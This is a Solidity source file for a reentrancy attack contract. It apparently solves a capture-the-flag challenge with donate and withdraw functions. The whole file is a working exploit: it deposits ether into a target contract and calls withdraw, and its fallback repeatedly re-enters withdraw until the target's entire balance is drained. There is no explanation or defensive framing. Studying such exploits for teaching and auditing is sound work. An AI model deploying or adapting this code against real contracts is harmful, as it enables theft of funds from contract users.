pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

interface IReentrancy {
    function balanceOf(address) external returns (uint);
    function withdraw(uint) external;
    function donate(address) external payable;
}

contract ReentrancyAttacker {

    IReentrancy challenge;

    constructor(address addr) {
        challenge = IReentrancy(addr);
    }

    function attack() public payable {
        challenge.donate{value: msg.value}(address(this));
        challenge.withdraw(msg.value);
    }

    fallback() external payable {
        uint remainingBalance = address(challenge).balance;
        if (remainingBalance > 0) {
            uint amount = remainingBalance < msg.value ? remainingBalance : msg.value;
            challenge.withdraw(amount);
        }
    }

}
